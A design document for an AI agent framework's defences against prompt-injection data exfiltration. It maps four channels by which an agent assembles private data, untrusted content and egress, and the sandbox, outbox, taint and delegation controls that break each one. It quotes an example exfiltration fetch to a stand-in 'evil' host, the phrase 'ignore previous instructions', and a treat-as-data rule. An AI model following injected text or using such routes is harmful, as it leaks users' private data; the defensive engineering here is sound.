# The trifecta map

The lethal trifecta is **private data + untrusted content + a way out**. An
agent holding all three can be instructed, by text hidden in what it reads, to
send what it knows to **whoever wrote the text**. mecha's answer is structural —
capability bits on every tool, a taint that arms as content arrives, and an
interlock that refuses the third leg once two are present (`agent.rs`, the
`TrifectaPolicy::Block` arm).

**Read "whoever wrote the text" literally: the attack needs the attacker to
pick the recipient.** So the third leg is not one bit but a class,
[`Egress`](../mecha-core/src/tool/mod.rs) — `None`, `Blind`, `Chosen` — and the
interlock fires on `Chosen` alone. A *blind* send is one whose destination the
operator fixed and whose tool schema has no field for it: `web_search` takes
`query`, `limit`, `depth` and nothing else, so the query reaches whatever
`[[search]]` names and an injection that fills it still has nobody to read it
back. That is a privacy question, not an injection one, and it has its own
switch below. `docs/EGRESS-DESIGN.md` is the full argument.

One interlock — but **four distinct ways a session assembles the legs**, each
broken by a different mechanism. (Channel 2 splits in two by egress class:
2 is a destination the model names, 2b one only your config names. Same
channel, different owner.) No single fix covers them all, and knowing
which mechanism owns which channel is the difference between tightening the
right screw and loosening policy in frustration. That frustration is not
hypothetical: every mechanism below exists because the alternative was an
operator reading refusals until they set `trifecta = "allow"`.

The design goal, stated once: **the restrictions are load-bearing and the
system is shaped so you never feel them.** Local work runs confined without
asking. Outbound mail becomes a draft you review. Web reading happens in a
clean conversation. When something *is* refused, the refusal names the way it
could stop being refused ([`denial_remedy`](../mecha-core/src/tool/mod.rs)).
A control that dead-ends its operator teaches them to weaken policy, which is
the worst outcome of a control working correctly.

## Channel 1 — local shell as the way out

Unconfined, `shell` can `curl` anything anywhere, so it truthfully declares
`external_send` and the interlock refuses it once mail or graph content is in
the conversation — including for `git log`, which cannot exfiltrate anything.

**Owned by: the sandbox.** `[sandbox]` with `network = false` confines
commands (bwrap or docker) with no network; `shell` derives `external_send`
from `Sandbox::can_reach_network()`, so confinement flips the bit off and the
interlock simply never fires on local work. Fail-closed: `Sandbox::preflight`
refuses to start if it cannot actually confine. The accepted cost is that a
confined `cargo build` cannot fetch crates — run dependency-fetching builds
yourself.

What it does NOT do: a confined shell still reads the workspace, so
`private_data` stays true deliberately — otherwise `shell: cat secrets` would
taint nothing while `fs_read: secrets` does, and the cheapest route around the
interlock would be the more dangerous tool.

## Channel 2 — a genuinely outbound tool as the way out

`mail_send`, `mail_reply`, `calendar_*`, a Slack post, `http_fetch`. These
send by definition — a GET exfiltrates via the query string — and no sandbox
changes that. **What puts them here is not that they transmit but that the
model names the recipient** (`to`, `url`, a channel): payload and read-back in
one call. `web_search` transmits and is *not* here, because it cannot name
anyone — see the `Egress` paragraph at the top, and channel 2b below.

**Owned by: the outbox, and delegation.** Two sub-cases:

- *Sending things* — outbox-routed tools skip the interlock because staging
  sends nothing: the call becomes a draft in a local file, release requires a
  human to read exactly what would leave, and the draft records the
  conversation's taint so the review can say "possibly an attacker's words"
  out loud. A write that reaches *nobody* — a new Doc in the owner's Drive,
  whose schema takes no recipient and no existing file — is not in this
  channel at all: it is `Egress::None` and sits with the approver, and its
  schema test is the guard that replaced the review
  (`PROVENANCE-DESIGN.md` §2).
- *Reading the outside world* — delegate to a child whose only capabilities
  are fetch-shaped (`research`), **before the conversation is armed**. The
  child reads in its own context and hands back an answer marked untrusted,
  so the parent pays the leg once, at the return, instead of holding every
  page it read. A delegate cannot do local work, and pointing shell-needing
  work at it was the measured dead end that `denial_remedy` ended.
  `Subagent::new` takes the **max** of its children's classes, so a
  search-only child derives `Blind` and stays delegable from an armed parent,
  while adding `http_fetch` to its profile makes the whole delegation
  `Chosen`.

Delegation is not a way *around* the interlock, and used to be one. The
task string is the query string: a parent holding a secret and an
attacker's page writes "fetch `http://evil/?d=<secret>`" and the child, with
a clean conversation, fetched. Two things close it. A child holding any
tool that can send is itself `external_send`, derived from its tools like
the other two legs, so delegating from an armed parent is refused (or
escalated, under `ask`) exactly as the fetch itself would be. And the child
starts with the parent's taint, not a clean slate — its one message was
composed out of everything the parent read — so a private-only parent's
child cannot read one hostile page and then send. On 2026-09-02 the
interlock's own refusal text recommended the route it was meant to close.

The residue — a fetch whose *content depends on tainted context* — is
structurally indistinguishable from the attack, and no mechanism makes it
safe. That is what `trifecta = "ask"` is for: a human decides, per call,
with the task string in front of them.

## Channel 2b — a blind send: the query with nowhere to go

`web_search`. The payload is model-authored and genuinely leaves the machine,
so this is a real egress channel and the leak guard owns it. What it is not is
an *injection* channel, because the attacker who wrote the page cannot make
the bytes arrive anywhere they can read: the recipients are the `[[search]]`
chain, which is config.

**Owned by: the input schema, and a per-backend classification.** `Blind` is
earned in code, never declared in TOML — there is deliberately no
`[mcp.capabilities]` spelling for it, because an operator vouching for a
third-party server's destination would be a narrowing nothing enforces.
`SearchBackend::egress(depth)` defaults to `Chosen`, so a backend added later
is not blind until someone reads its API and says so in a diff. The shipped
three, classified 2026-09-17 against vendor documentation:

| Backend | Quick | Deep | Why |
|---|---|---|---|
| searxng | Blind | Blind | `q` goes to the engines in its own `settings.yml` |
| tavily | Blind | Blind | `search_depth` ranks and extracts; crawling is a separate API mecha never calls |
| exa | Blind | **Chosen** | `deep-reasoning` is agentic research that *fetches pages the query steers it towards* |

`web_open` is the same class by the same argument, one step on: its only
argument is the handle `web_search` printed beside a result, so the page it
fetches is one the backend returned and the model never writes a URL
(`PROVENANCE-DESIGN.md` §4). What it leaks is which result was chosen.

An armed conversation is served by the blind backends only, at quick depth
(`SearchChain::search_blind`), and the result says so rather than silently
answering shallower. With no blind backend configured there is no armed path
at all, so `web_search` declares `Chosen`, is refused, and its `denial_remedy`
names `kind = "searxng"`.

**What this does not close**, stated so nobody mistakes it for closed: a blind
query is low-bandwidth but calls compose, and nothing bounds the total; the
backend is still a third party that sees your query; and a vendor could add
query-URL dereference and make a classification silently wrong. Against those,
the status quo's failure mode was an operator setting `trifecta = "allow"` and
waiving the interlock over `http_fetch`, `mail_send`, Slack and an unconfined
`shell` at once. `docs/EGRESS-DESIGN.md` §6 has the full accounting.

## Channel 3 — the untrusted content itself

Before any send is attempted, the injected text has to be read. This channel
is not about stopping exfiltration but about arming the taint honestly and
keeping instructions from being followed.

**Owned by: source declarations and wrapping.** MCP servers that custody
third-party text carry `untrusted_input = true` in config (the graph, mail — no
annotation can say "untrusted", so the config override is load-bearing).
Tool results that really came from outside are wrapped in
`<untrusted-content>` markers telling the model to treat them strictly as
data. The declared capability is what arms the leg; the wrapper is advisory
armor on top, never the enforcement.

## Channel 4 — a subagent laundering the legs apart

A child reads the mail and hands the parent "a summary" — is the summary
clean? No, twice over, and `Subagent::new` derives both answers from the
child's own tools so nobody has to remember:

- A summary of attacker-influenced text can still carry instructions, so a
  child with untrusted-capable tools yields an untrusted-capable subagent.
- A summary *made of* private data is still private, so the private leg
  survives the return no matter what. `trusted_output` never touches it.
- A child that can send makes the delegation a send, so the third leg
  derives too — and the child inherits the parent's taint on the way in,
  because the legs can be laundered in either direction (channel 2).

**Owned by: capability derivation, plus the shaped vouch.** `trusted_output`
is the one deliberate narrowing, and it is an *offer*, not a waiver: it must
name an `answer_shape` (`"number"`, `"boolean"`, or a closed list), a bare
`trusted_output = true` refuses to construct, and each answer earns the trust
at return time by parsing as the declared shape. Instructions cannot hide in
`42` or `yes`; they hide in prose, and prose never matches a shape. A
mismatch comes back marked untrusted with a note saying why. There is
deliberately no bounded-string shape — "ignore previous instructions" fits in
very few characters, so a length cap vouches for nothing.

## Scheduled pushes — a way out with no model in it

Two timers send private data off the machine on a schedule, with no review
of each push: `mecha-slots` (your free time, as bookable slots, to the
factory's booking page) and the dashboard refresh (`mecha hud refresh`, a
released board's datasets, to its page on the factory). Neither is a channel
an injection can steer, because no model is in either path: a timer runs a
query the owner already released and sends its rows to one fixed host.

**Owned by: the release review, the key's scope, and the box's checks.**
- *The review, once.* What runs unattended is exactly what a human released
  (`LIVE-DASHBOARD-DESIGN.md` §6.3): in the web outbox, a dashboard's publish
  shows the page with real numbers (framed from a separate preview origin)
  beside each loader's query and declared shape, and releasing it approves
  both. `mecha outbox show` in a terminal prints the same queries with the
  same two marks — third-party content, changed since staged — from the same
  producer, and points at the staged page rather than rendering it; the
  preview frame serves only rows the release would receive. A changed loader,
  query or shape is a new publish, back through the outbox, and home refuses
  to push a dataset whose loader digest differs from the released one.
- *The key.* Each timer holds a key of its own narrow scope (`slots`,
  `data`), which can do that one thing and cannot publish, release or read.
- *The box.* A dataset push is refused unless its columns and loader digest
  equal what the release's `datasets.json` declared.

**What this does not close.** A loader over a source whose content is
third-party publishes that text under your name without a second look —
the review marks such a loader (a source whose `content` is third-party
or unset), and that mark is the whole control.
And the push is unreviewed per push by design: a stolen `data` key can
misstate a released dashboard's numbers, in the released shape, until it is
revoked.

## The switches, and what each one costs

| Switch | Default | What it changes |
|---|---|---|
| `[sandbox] network = false` | sandbox off entirely | Confines `shell`; local work stops tripping the interlock. Costs: no network in confined commands. |
| `trifecta = "block" \| "ask" \| "allow"` | `block` | Applies to `Egress::Chosen` only — a blind send is not this control's threat. `ask` escalates armed sends to a person through `Approver::escalate`, past any "always" list or permission mode, and shows the whole payload rather than a 100-character gist (`summarize_forced`); an approver that cannot reach a person (eval, replay, `--yes`, a headless run) answers `Blocked`, so `ask` never quietly equals `allow`. `allow` waives the injection interlock entirely — the leak guard below still applies. |
| `block_sends_after_private` | off | The leak guard: refuses sends once private data is present, injection or not — **including blind ones**, which the interlock deliberately allows. This is the switch for "no private data reaches a third party, even at my own request". Off by default because it breaks ordinary work — the default posture defends the injection path, not deliberate egress. |
| `[[grant]]`, `/grant`, `request_access` | none | **Widens the private-data leg, never the way out**: a directory outside the workspace that file tools (and a confined `shell`, mounted to match) may read or write (`ARCHITECTURE.md` §The path jail, grants). **Owned by: `grant::admit` and `Approver::escalate_access`.** Only a person makes one: the global config (stripped from a project layer and an experiment environment), the owner's `/grant`, or a yes on a card — to the model's `request_access`, or to a file tool reaching outside the workspace — which always escalates: `--yes`, eval and a headless run answer `Blocked`. A voice call's `--voice-yes` is the exception that still asks: its approver answers everything else from the flag, puts a grant on the page's card and waits for the tap, and keeps the interlock's `ask` refused (owner, 2026-10-18). The mecha home and credential directories are never admitted, whoever asks. Reads through a grant arm `private_data` like workspace reads, so the interlock stands unchanged. Costs: more of the owner's files are one call away, which is the point; `--no-grants` runs without. |
| `[[search]]` with a blind backend | none | Whether `web_search` works at all in an armed conversation. Costs: an armed search is quick-depth on that backend. |
| `[[rule]]` + `[approval] strict_inline_eval` | none · on | Per-command approval rules (`ARCHITECTURE.md` §Approval rules). A rule narrows and never loosens what the *interlock* permits: `forbid` refuses unasked, `prompt` asks (and where nobody can be asked, refuses), `allow` only removes the human prompt and never the interlock, an escalation, or a read-only mode. One honest exception on what *executes*: under a headless `Ask` (a trigger, `batch`) an `allow`-ruled write runs where the mode alone refused it — the rule is the yes the run had nobody to give. Not a trifecta switch at all — listed because it is the answer to "the approver asks too often", where `trifecta = "allow"` is the wrong one. |
| `trusted_output` + `answer_shape` | off | Per-answer trust for shape-provable child answers. Costs: the child's answer must literally be a value. |
| `[[mcp]] trust_result_claims` | off | **One of the two switches that trust a server more, not less** (the other is `[[mcp]] personas`, below) — the deliberate exception to "`[mcp.capabilities]` only widens" (ruling R-P2, `PROVENANCE-DESIGN.md` §3). The server's claims about its own results, in `_meta` under `mecha-factory.ai/`, are believed; today one claim, `dispatched: false` ("refused before any request"), which lets the outbox settle a failed send as not delivered instead of leaving it for the owner to reconcile. Global config only — a project layer's, an experiment environment's, or an eval `--mcp-file`'s is cleared, loudly — and named by `mecha tools` (per tool, and `result_claims_believed` in `--json` — `null` where an unprefixed vouched server makes it unknowable by name) and in `mecha doctor`'s text output. Costs: that server's word about whether it sent something is taken; turn it on only for a server you wrote or can read. |
| `[[mcp]] personas` | off | **Offers a server's tools to persona chats**, on the owner's word that the server reads none of the owner's private stores — the declaration a persona form makes, which a remote server cannot be trusted to make of itself (`BACKGROUND-JOBS-DESIGN.md` §9, `PERSONA-DESIGN.md` §3.3). It admits nothing alone: each persona still names the tools it wants, the persona registry still refuses any whose reach is `Chosen` and any that is not read-only (a persona's run is), and a background call tells the server only which persona asks (folder name, linked character and voice name). Global config only — a project layer's, an experiment environment's, or an eval `--mcp-file`'s is cleared, loudly — and named by `mecha tools` (`offered_to_personas` in `--json`) and in `mecha doctor`'s text output. Costs: a persona's conversation can reach that server, so turn it on only for a server you wrote or can read. |
| `[agent] situation_brief` | off | Delivers the harness's situation brief into the run's first user turn (`APPRAISAL-WIRING-DESIGN.md` B1, 3a). **Delivering it arms `private`** (R35, the owner's ruling, 2026-09-25), which fails closed exactly as reading the board through `kg_task_list` does. **Owned by: the taint, not the tool list.** The loop arms at the fold (`Agent::fold_situation_brief`), and `Taint::arm_for_content` arms again from any transcript that holds a brief, which is the attached image's precedent: content that enters without a tool call still arms what a tool reading it would have. The words are the owner's board ids and counts, commitment bands, quiet hours, seat holders and runs in flight, and on a task run its previous attempts (3a-2, R42): session and record ids, closed words for the owner's acts, and a reopen reason only when the owner wrote it with their own hand — never an outbox rejection reason (R42(d); quoting an owner-stamped one, now that resolves carry an actor, is a follow-up). Nothing in them came from outside, so arming `untrusted` stays with whatever actually reads outside content. Costs: a run holding the brief is half-armed from its first turn. A later untrusted read (a fetched page, a mail body) makes the interlock refuse `Egress::Chosen` sends, as it would after a board read, and `block_sends_after_private` refuses every send from the first turn. A fresh `Conversation` starts clean, and the session file records the taint like any other. |
| `[agent] past_appraisals` | off | Lets `goal_context` serve up to three past clean appraisals of the run's situation and goal (`APPRAISAL-WIRING-DESIGN.md` I2, 2c-2). **Owned by: the tool's capability and the store's clean door.** Only an appraisal of a run whose recorded taint had no untrusted content can be served (`appraisal_store::Clean`), the result is never `external`, and `goal_context` is already `private` — a clean run may still have read the owner's mail, and its appraisal can say so. Costs: calling `goal_context` arms `private` as it always has; nothing new reaches the prefix. |
| `[agent] success_examples` | off | Lets `goal_context` serve planning success examples: the tool sequence of a session the owner verified (a `done` closure no reopen undoes, a workflow closed, a question answered whose session completed), toward the goal asked about, in the run's situation (`APPRAISAL-WIRING-DESIGN.md` L2, 2e-4b-1, R40). **Owned by: the tool's capability and the session's recorded taint.** Only a session whose recorded taint covers its end with no untrusted content lends one (`learning::classify_origin`; no checkpoint is unknown, never clean), the example is registry tool names and a record pointer (no argument, no model prose; a name rides only for a call a registered tool answered, `agent::calls_a_tool_answered`, because a `tool_use` records whatever name the model wrote; any other call is a step spelled `agent::UNANSWERED_CALL`), the result is never `external`, and `goal_context` is `private` — R35's arming for the owner's own work, which it is. Costs: calling `goal_context` arms `private` as it always has; nothing new reaches the prefix. The diagnostician's run is narrowed off it (a held-out session could lend one). |
| `[agent] contrast_evidence` | off | Lets `mecha reflect` show the reflector, beside a steer, denial or followup, a verified success from the correction's region (`APPRAISAL-WIRING-DESIGN.md` L2, 2e-4b-2, R43). **Owned by: the success session's recorded taint and provenance-gated learning.** Only a session whose recorded taint covering its end has no untrusted content lends one (`learning::classify_origin`; unknown is never clean), and what rides is the owner's act in fixed words and registry tool names (only calls a registered tool answered, `agent::calls_a_tool_answered`) — no argument, no prose, no record id — so the reflector's input gains nothing a third party wrote and the reflection's `Origin` is decided as before. A stage lever read by `reflect`, never by a run: no run's prefix or taint moves. Costs: the behaviour frame gains one sentence with it on, so reflections from a pass with it on are not the same measurement as one without; it ships off until a measured run. |
| `[agent] digests_in_brief` | on | Hands the nightly diagnostician (`harness ruminate`) a closed-set digest of each episode its candidate may be selected from: tool names, failed and external flags, stop cause, and where the owner stepped in. Drawn from the pool minus its holdout (`HARNESS-EVOLUTION-DESIGN.md` P9). **A brief carrying digests opens the conversation `private` and `untrusted`.** **Owned by: the taint, and the digest's constructor.** `EpisodeDigest::of` is the only way to make one, and it walks typed blocks: no argument, result or written word can enter. A tool name that isn't a plain identifier is withheld. Untrusted because an MCP server chooses its own tool names, and a sentence can be shaped like an identifier. This is stricter than the learning paths on purpose. The withheld view, a rule's scope and the success examples carry a name only for a call a registered tool answered (`agent::calls_a_tool_answered`), so a name the model invented never rides. Any other call stands as the fixed phrase `agent::UNANSWERED_CALL`, so a rule's scope keeps the key and never widens. They treat a configured MCP server's advertised names as the registry's, the standing its descriptions already have in every run's prefix. The digest keeps invented calls, because a call to a tool that doesn't exist is diagnostic signal. `Evidence::conversation` arms both at the start, and `Taint::arm_for_content` arms them again off the transcript by `diagnose::DIGEST_STEM`. **Costs:** on a night with digests, which is every night with the defaults, the interlock refuses the diagnostician's `http_fetch` from the first turn. `web_search`, which narrows on `private && untrusted`, runs blind backends at quick depth whatever depth it asks for, and only where the `[[search]]` chain has a blind backend. With none, the diagnostician has no web research at all. An appraisals-only night kept the full chain at the asked depth until its first external read. With `block_sends_after_private` on, it refuses every send. Off restores the fetch and the full search, and withdraws the digests and the citation rule together. It is a lifetime experiment's stage lever. |
| `[agent] appraisals_in_brief` | on | Hands the nightly diagnostician (`harness ruminate`) the clean appraisals of the episodes its candidate will be measured on — the draw's pool minus its holdout (`APPRAISAL-WIRING-DESIGN.md` L8, 2f). **A brief carrying one opens the diagnostician's conversation `private`** (R38, the owner's ruling, 2026-09-25/26), fail-closed as `situation_brief` is. **Owned by: the taint and the store's clean door.** Only a `Clean` appraisal becomes a note (`diagnose::AppraisalNote`), and `Evidence::conversation` sets `private` at the start — and `Taint::arm_for_content` arms it again off the transcript by the section's stem (`diagnose::APPRAISAL_STEM`), the `situation_brief` precedent, so a caller that renders the brief itself cannot open it clean — since a clean run may still have read the owner's files and its appraisal can say so. No quote from the appraised run rides, and nothing in the brief came from outside, so `untrusted` is left to whatever the diagnostician reads. Costs: on a night whose brief carries an appraisal, the diagnostician's research is thinner. Its first fetched page arms the interlock, so later `http_fetch` calls are refused and it continues on blind `web_search` only — and only where the `[[search]]` chain has a blind backend; with none, an armed conversation has no web research at all. With `block_sends_after_private` on, it refuses every send, blind ones included, from the first turn on those nights. `mecha diagnose` run by hand carries no appraisals and is unchanged. Off is a lifetime experiment's stage lever. |
| Locking a library style or location (`mecha imagelib lock`) | unlocked | **Keeps its name out of conversations' prefixes.** `image_generate`'s description lists approved, unlocked style names, and `video_generate`'s schema lists approved, unlocked location names (`IMAGE-COMPILER-DESIGN.md` §9.5, L5), in every chat that can draw (persona and incognito included) or film (persona included), with nothing armed: both tools declare `Capabilities::default()`. So an unarmed conversation can read those names from its own prefix and hand them to a `Chosen` sender. A style name is a rendering idiom; a location's name may be a place the owner goes. **Owned by: the lock**, the owner's lever for a name they don't want listed; a locked entry still resolves when named, since the lock is for browsing. Costs: an unlisted name is used only when someone says it. |
| `subagent trusted_output` without shape | — | Refuses to construct. This is not a switch; it is the hole that used to be one. |

## What to do when something is refused

The refusal itself now says — that is `denial_remedy`. But the general moves,
in order of preference: confine it (channel 1), stage it (channel 2, sends),
reach for the blind route the refusal names (channel 2b), delegate it before
the conversation arms (channel 2, reads), shape it (channel 4) — and only then
`trifecta = "ask"`, which puts a human where a structure should have been.

And if the complaint is *"I cannot search the web once I have read my mail"*:
that is fixed, and the fix is channel 2b rather than a switch. If it still
happens, you have no blind backend configured, or
`block_sends_after_private` is on, and the refusal text says which.
